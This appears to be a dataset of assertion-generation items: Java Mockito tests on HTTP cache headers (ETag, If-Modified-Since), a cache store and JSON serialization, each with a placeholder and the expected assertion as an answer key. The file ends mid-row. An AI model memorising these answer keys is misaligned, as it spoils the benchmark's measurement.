checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertFalse(b)
"testCheckAndSet_EnableCaching_LastModified() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(null); Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(0L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModifiedNow() .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.ETAG, obj.createETag()); Mockito.verify(resp, ONCE).setDateHeader(HttpCacheControl.LAST_MODIFIED, obj.getResource().getLastModified()); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertFalse(b)
"testCheckAndSet_EnableCaching_IfNoneMatch_false() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(""W/""FooBar"""");//non-matching E-Tag Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(0L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModifiedNow() .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.ETAG, obj.createETag()); Mockito.verify(resp, ONCE).setDateHeader(HttpCacheControl.LAST_MODIFIED, obj.getResource().getLastModified()); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertFalse(b)
"testCheckAndSet_EnableCaching_IfNoneMatch_true() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(""W/""FooBar"", W/""13-535168142"""");//matching E-Tag Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(0L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModifiedNow() .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setStatus(HttpServletResponse.SC_NOT_MODIFIED); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertTrue(b)
"testCheckAndSet_EnableCaching_IfModifiedSince_Modified() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(null); Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(1000000L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModified(2000000L) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.ETAG, obj.createETag()); Mockito.verify(resp, ONCE).setDateHeader(HttpCacheControl.LAST_MODIFIED, obj.getResource().getLastModified()); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertFalse(b)
"testCheckAndSet_EnableCaching_IfModifiedSince_ModifiedAtFidelityPlus1() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(null); Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(1000000L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModified(1000000L + HttpCacheControl.IF_MODIFIED_SINCE_FIDELITY + 1L) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.ETAG, obj.createETag()); Mockito.verify(resp, ONCE).setDateHeader(HttpCacheControl.LAST_MODIFIED, obj.getResource().getLastModified()); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertFalse(b)
"testCheckAndSet_EnableCaching_IfModifiedSince_NotModifiedAtFidelity() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(null); Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(1000000L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModified(1000000L + HttpCacheControl.IF_MODIFIED_SINCE_FIDELITY) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setStatus(HttpServletResponse.SC_NOT_MODIFIED); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertTrue(b)
"testCheckAndSet_EnableCaching_IfModifiedSince_NotModified() { Mockito.when(req.getPathInfo()).thenReturn(""/""); Mockito.when(req.getHeader(HttpCacheControl.ETAG)).thenReturn(null); Mockito.when(req.getHeader(HttpCacheControl.IF_NONE_MATCH)).thenReturn(null); Mockito.when(req.getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE)).thenReturn(1000000L);  BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(StandardCharsets.UTF_8)) .withCachingAllowed(true) .withLastModified(900000L) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = cc.checkAndSetCacheHeaders(req, resp, obj); Assert.""<AssertPlaceHolder>"";  Mockito.verify(req, ANY_TIMES).getPathInfo(); Mockito.verify(req, ANY_TIMES).getAttribute(""jakarta.servlet.forward.path_info""); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.ETAG); Mockito.verify(req, ANY_TIMES).getHeader(HttpCacheControl.IF_NONE_MATCH); Mockito.verify(req, ANY_TIMES).getDateHeader(HttpCacheControl.IF_MODIFIED_SINCE); Mockito.verify(resp, ONCE).setHeader(HttpCacheControl.CACHE_CONTROL, ""private, max-age=0, must-revalidate""); Mockito.verify(resp, ONCE).setStatus(HttpServletResponse.SC_NOT_MODIFIED); }
checkAndSetCacheHeaders(HttpServletRequest req, HttpServletResponse resp, HttpCacheObject obj) { if (!UrlHints.isCacheHint(req)) { disableCaching(req, resp); return false; }  if (obj == null || !obj.isCachingAllowed()) { disableCaching(req, resp); return false; }  int maxAge = obj.getCacheMaxAge(); if (maxAge > 0) { // ""private"" //   Only browsers may cache this resource. // ""max-age"" //   A cache may use this resource for X seconds without checking with the server. s-maxage //   is basically the same, but for proxies (s = shared). This overrides any default value //   the proxy may use internally. // Note: Because ""must-revalidate"" is not present, a cache MAY use a stale resource longer than max-age. resp.setHeader(CACHE_CONTROL, ""private, max-age="" + maxAge + "", s-maxage="" + maxAge); } else { // ""private"" //   Only browsers may cache this resource. // ""must-revalidate"" //   A cache HAS TO check with the server before using stale resources. // ""max-age=0"" //   A resource will become stale immediately (after 0 seconds). // Note: ""max-age=0, must-revalidate"" would be the same as ""no-cache"" resp.setHeader(CACHE_CONTROL, ""private, max-age=0, must-revalidate""); }  String etag = obj.createETag(); String ifNoneMatch = req.getHeader(IF_NONE_MATCH); boolean clientSentEtag = (ifNoneMatch != null);  // Check If-None-Match (Etag) if (clientSentEtag) { if (notModified(ifNoneMatch, etag)) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-None-Match/Etag): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } // When the Etag comparison fails (i.e. file was modified), we must _not_ check for If-Modified-Since! } // Check If-Modified-Since else { long ifModifiedSince = req.getDateHeader(IF_MODIFIED_SINCE); if (notModifiedSince(ifModifiedSince, obj.getResource().getLastModified())) { if (LOG.isDebugEnabled()) { LOG.debug(""Use http cached object (If-Modified-Since): {}"", req.getPathInfo()); } resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED); return true; } }  if (obj.getResource().getLastModified() > 0) { resp.setDateHeader(LAST_MODIFIED, obj.getResource().getLastModified()); } if (etag != null) { resp.setHeader(ETAG, etag); }  return false; }"	assertTrue(b)
"Exception { BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(""UTF-8"")) .build(); HttpCacheKey key = new HttpCacheKey(""/""); HttpCacheObject obj = new HttpCacheObject(key, res); boolean b = rc.put(obj); Assert.""<AssertPlaceHolder>""; }
put(HttpCacheObject obj) { if (!obj.isCachingAllowed()) { return false; } m_cache.put(obj.getCacheKey(), obj); LOG.debug(""Stored object in cache: {}"", obj.getCacheKey()); return true; }"	assertFalse(b)
"Exception { BinaryResource res = BinaryResources.create() .withFilename(""a.html"") .withContent(""<html></html>"".getBytes(""UTF-8"")) .withCachingAllowed(true) .build(); HttpCacheObject obj = new HttpCacheObject(new HttpCacheKey(""/""), res); boolean b = rc.put(obj); Assert.""<AssertPlaceHolder>""; }
put(HttpCacheObject obj) { if (!obj.isCachingAllowed()) { return false; } m_cache.put(obj.getCacheKey(), obj); LOG.debug(""Stored object in cache: {}"", obj.getCacheKey()); return true; }"	assertTrue(b)
"testGet() { HttpCacheKey key = new HttpCacheKey(""/""); HttpCacheObject obj = rc.get(key); Assert.""<AssertPlaceHolder>""; }
get(HttpCacheKey cacheKey) { HttpCacheObject obj = m_cache.get(cacheKey); LOG.debug(""Lookup object in cache: {} found={}"", cacheKey, obj != null); return obj; }"	assertNull(obj)
"Exception { String expected = StringUtility.trim(readFile(""json/DefaultValuesFilterServiceTest_defaults_override_expected.json"")); String actual = BEANS.get(DefaultValuesFilterService.class).getCombinedDefaultValuesConfiguration(); ""<AssertPlaceHolder>""; }
getCombinedDefaultValuesConfiguration() { ensureLoaded(); return m_combinedDefaultValuesConfiguration; }"	assertEquals(expected, actual)
"testBeanWithDate() { BeanWithDate bean = new BeanWithDate(); Calendar cal = Calendar.getInstance(); cal.set(2015, 8, 24, 17, 38, 9); cal.set(Calendar.MILLISECOND, 0); bean.setDate(cal.getTime());  MainJsonObjectFactory factory = new MainJsonObjectFactory(); IJsonObject jsonObj = factory.createJsonObject(bean);  JSONObject json = (JSONObject) jsonObj.toJson(); ""<AssertPlaceHolder>""; }
toJson() { if (m_bean == null) { return null; }  Class<?> type = m_bean.getClass(); // basic types if (type.isPrimitive() || type == String.class || type == Boolean.class || Number.class.isAssignableFrom(type)) { return m_bean; }  // binary resource if (BinaryResource.class.isAssignableFrom(type)) { BinaryResource binaryResource = (BinaryResource) m_bean; m_binaryResourceMediator.addBinaryResource(binaryResource); return m_binaryResourceMediator.createUrl(binaryResource); }  // array if (type.isArray()) { JSONArray jsonArray = new JSONArray(); int n = Array.getLength(m_bean); for (int i = 0; i < n; i++) { IJsonObject jsonObject = createJsonObject(Array.get(m_bean, i)); jsonArray.put(jsonObject.toJson()); } return jsonArray; }  // collection if (Collection.class.isAssignableFrom(type)) { JSONArray jsonArray = new JSONArray(); Collection<?> collection = (Collection<?>) m_bean; for (Object object : collection) { IJsonObject jsonObject = createJsonObject(object); jsonArray.put(jsonObject.toJson()); } return jsonArray; }  // Map if (Map.class.isAssignableFrom(type)) { JSONObject jsonMap = new JSONObject(); Map<?, ?> map = (Map<?, ?>) m_bean; Set<? extends Entry<?, ?>> entries = map.entrySet(); for (Entry<?, ?> entry : entries) { if (!(entry.getKey() instanceof String)) { throw new IllegalArgumentException(""Cannot convert "" + type + "" to json object""); } IJsonObject jsonObject = createJsonObject(entry.getValue()); jsonMap.put((String) entry.getKey(), jsonObject.toJson()); } return jsonMap; }  // bean if (type.getName().startsWith(""java."")) { throw new IllegalArgumentException(""Cannot convert "" + type + "" to json object""); } try { SortedMap<String, Object> properties = new TreeMap<>(); for (Field f : type.getFields()) { if (Modifier.isStatic(f.getModifiers())) { continue; } String key = f.getName(); Object val = f.get(m_bean); IJsonObject jsonObject = createJsonObject(val); properties.put(key, 